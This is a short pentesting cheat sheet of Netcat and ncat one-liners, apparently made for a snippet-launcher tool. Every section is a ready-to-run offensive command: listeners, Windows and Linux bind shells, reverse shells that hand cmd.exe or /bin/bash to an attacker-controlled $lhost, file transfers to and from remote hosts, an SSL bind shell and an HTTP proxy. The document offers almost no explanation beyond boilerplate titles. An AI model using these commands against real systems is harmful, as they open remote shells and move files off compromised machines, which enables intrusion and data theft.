# Netcat

## netcat

### Listener

Read listener with Netcat.

```sh title:"Netcat Read Listener"
nc -lvnp $lport
```
<!-- cheat
import lports
-->

### Windows bind shell

Read windows bind shell with Netcat.

```cmd title:"Netcat Read Windows Bind Shell"
nc -lvnp $rport -e cmd.exe
```
<!-- cheat
var rport
-->

### Linux bind shell

Read linux bind shell with Netcat.

```sh title:"Netcat Read Linux Bind Shell"
nc -lvnp $rport -e /bin/bash
```
<!-- cheat
var rport
-->

### Windows reverse shell

Read windows reverse shell with Netcat.

```cmd title:"Netcat Read Windows Reverse Shell"
nc -nv $lhost $lport -e cmd.exe
```
<!-- cheat
import lports
import tun_ip
-->

### Linux reverse shell

Read linux reverse shell with Netcat.

```sh title:"Netcat Read Linux Reverse Shell"
nc -nv $lhost $lport -e /bin/bash
```
<!-- cheat
import lports
import tun_ip
-->

### Download file via nc

Download file via nc with Netcat.

```sh title:"Netcat Download File Via Nc"
echo "nc $rhost_ip $lport < $target_file_name" | xclip -sel clip; nc -lvnp $lport > $downloaded_file_name; md5sum $downloaded_file_name
```
<!-- cheat
import lports
import tun_ip
import files
import domain_ip
var target_file_name
var downloaded_file_name
-->

### Upload file via nc

Upload file via nc with Netcat.

```sh title:"Netcat Upload File Via Nc"
echo "nc -lvnp $lport > $receiving_file_name" | xclip -sel clip; md5sum $file; nc $rhost_ip $rport < $file
```
<!-- cheat
import lports
import tun_ip
import files
import domain_ip
var target
var rport
var receiving_file_name
-->

## ncat

### SSL bind shell

Read SSL bind shell with Netcat.

```cmd title:"Netcat Read SSL Bind Shell"
ncat --exec cmd.exe --allow $allowed_ip -vnl $rport --ssl
```
<!-- cheat
var allowed_ip
var rport
-->

### Connect SSL bind shell

Read connect SSL bind shell with Netcat.

```sh title:"Netcat Read Connect SSL Bind Shell"
ncat -v $rhost_ip $rport --ssl
```
<!-- cheat
var rhost_ip
var rport
-->

### HTTP proxy

Read HTTP proxy with Netcat.

```sh title:"Netcat Read HTTP Proxy"
ncat --listen --proxy-type http $lport
```
<!-- cheat
var lport
-->
